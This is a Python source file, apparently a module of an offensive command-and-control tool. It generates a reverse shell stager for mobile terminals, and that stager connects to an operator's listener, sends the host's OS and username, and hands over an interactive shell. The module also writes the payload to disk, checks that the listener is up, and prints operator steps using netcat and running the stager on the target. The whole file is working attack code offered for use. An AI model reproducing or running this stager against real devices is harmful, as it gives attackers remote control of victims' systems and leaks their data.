import os
import sys
import socket
import time

def generate_python_reverse_shell_stager(listener_ip, listener_port):
    """
    Generates an elite, resilient Python reverse shell stager engineered for 
    mobile execution environments (iSH, a-Shell, Termux) featuring automatic 
    shell resolution and telemetry pre-dumping.
    """
    stager_code = f'''# BruteDog Elite Mobile C2 Reverse Shell Stager (Production Grade)
import socket, subprocess, os, sys, platform

def resolve_mobile_shell():
    """Dynamically resolves available shell binaries in restricted environments."""
    for candidate in ["/bin/bash", "/bin/sh", "/system/bin/sh", "sh"]:
        if os.path.exists(candidate) or candidate == "sh":
            return candidate
    return "sh"

def spawn_c2_shell():
    HOST = "{listener_ip}"
    PORT = {listener_port}
    
    # Retry loop for mobile network instability (common in field red-teaming)
    max_retries = 3
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10.0)
            s.connect((HOST, PORT))
            s.settimeout(None)
            
            # Send initial host telemetry handshake upon connection
            telemetry = f"[+] HANDSHAKE // OS: {{platform.system()}} {{platform.release()}} // User: {{os.getenv('USER', 'unknown')}}\\n"
            s.sendall(telemetry.encode("utf-8"))
            
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            shell_bin = resolve_mobile_shell()
            subprocess.call([shell_bin, "-i"])
            break
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
            else:
                sys.exit(1)

if __name__ == "__main__":
    spawn_c2_shell()
'''
    os.makedirs("reports/payloads", exist_ok=True)
    payload_path = "reports/payloads/c2_stager.py"
    with open(payload_path, "w", encoding="utf-8") as f:
        f.write(stager_code)
    return payload_path

def verify_listener_socket(listener_ip, listener_port, timeout=2.0):
    """
    Actively checks if the operator listener node is listening on the specified port 
    before declaring stager deployment successful.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((listener_ip, listener_port))
        s.close()
        return result == 0
    except Exception:
        return False

def deploy_c2_stager(listener_ip="10.0.0.5", listener_port=4444):
    """Compiles stager payload and verifies operator listener status."""
    print(f"\n\033[95m[***] DEPLOYING ELITE C2 CALLBACK STAGER MODULE [***]\033[0m")
    path = generate_python_reverse_shell_stager(listener_ip, listener_port)
    
    # Active listener verification check
    listener_active = verify_listener_socket(listener_ip, listener_port)
    
    print(f" \033[92m[+] Mobile C2 Stager compiled successfully -> Saved to: {path}\033[0m")
    if listener_active:
        print(f" \033[92m[+++] LISTENER VERIFIED: Active listener detected on {listener_ip}:{listener_port}!\033[0m")
    else:
        print(f" \033[93m[!] WARNING: No active listener detected on {listener_ip}:{listener_port}.\033[0m")
        
    print(f" \033[93m[*] Operator Listener Instructions:\033[0m")
    print(f"     1. Run netcat on your listener node: nc -lvnp {listener_port}")
    print(f"     2. Execute stager on target/mobile terminal: python3 {path}\n")
    return path
